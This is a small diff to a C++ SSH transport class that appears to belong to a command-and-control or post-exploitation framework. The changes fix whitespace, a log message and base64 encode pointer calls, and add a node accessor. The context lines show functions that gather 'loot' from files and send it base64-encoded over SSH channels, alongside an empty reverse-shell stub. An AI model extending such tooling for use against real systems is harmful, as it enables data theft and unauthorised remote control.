@@ -30,7 +30,7 @@ int Ssh_Transport::determine_handler(){
         if(message){
             switch(ssh_message_type(message)){
                 case SSH_REQUEST_CHANNEL_OPEN:
-					sprintf(logbuff, "Client %s: Got request for opening channel\n", this->node->data->id); 
+                    sprintf(logbuff, "Client %s: Got request for opening channel\n", this->node->data->id); 
                     this->logger->log(logbuff);
                     if(ssh_message_subtype(message)==SSH_CHANNEL_SESSION){
                         this->node->data->chan=ssh_message_channel_request_open_reply_accept(message);
@@ -188,12 +188,12 @@ int Ssh_Transport::upload_file(char *ptr, int is_module){
     
     rc = ssh_channel_read(this->node->data->chan, buff, sizeof(buff), 0);
     if(rc == SSH_ERROR){
-        sprintf(logbuff, "Client %s: Failed to write data to channel: %s\n", this->node->data->id, ssh_get_error(this->node->data->session));
+        sprintf(logbuff, "Client %s: Failed to read data to channel: %s\n", this->node->data->id, ssh_get_error(this->node->data->session));
         this->logger->log(logbuff);
         return 1;
     }
         
-     B64::encode((unsigned char *)file_data, size, enc_data);
+     B64::encode((unsigned char *)file_data, size, &enc_data);
         
     // writes file 
     rc = ssh_channel_write(this->node->data->chan, enc_data, size_e);
@@ -418,7 +418,7 @@ int Ssh_Transport::get_loot(char *loot){
                     tmp_ptr = (char *)malloc(size);
                     memset(tmp_ptr, 0, size);
                     fread(tmp_ptr, 1, size, file);
-                    B64::encode((unsigned char*)tmp_ptr, size, tmp_ptr2);
+                    B64::encode((unsigned char*)tmp_ptr, size, &tmp_ptr2);
                     free(tmp_ptr);
                     memset(buff, 0, 256);
                     sprintf(buff, "%d", size_e);
@@ -702,4 +702,8 @@ void Ssh_Transport::make_agent(char *dat_ptr, char *d_ptr){
 
 int Ssh_Transport::init_reverse_shell(){
     return 0;
+}
+
+pClientNode Ssh_Transport::get_node(){
+    return this->node;
 }
